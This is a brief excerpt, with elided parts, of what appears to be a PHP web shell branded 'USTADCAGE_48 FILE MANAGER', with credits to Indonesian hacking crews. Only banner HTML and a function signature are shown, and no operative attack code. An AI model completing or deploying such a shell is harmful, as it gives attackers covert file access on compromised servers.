...
echo '</head>
<body><b>
<H1><center> &lt;/&gt; <font color="red">USTADCAGE_48</font> <font color="dodgerblue">FILE MANAGER</font></center></h1>
...
echo '<br><center>{ X48 - RES7OCK CREW - INDOXPLOIT CODERS - SUMEDANG CYBER TEAM }<br>[SKILL 1%] [BACOT 98%] [COLI 1%]<br>&lt;/&gt; ZONE_BLACK_HOLE</b></body>
</html>';
function perms($file){
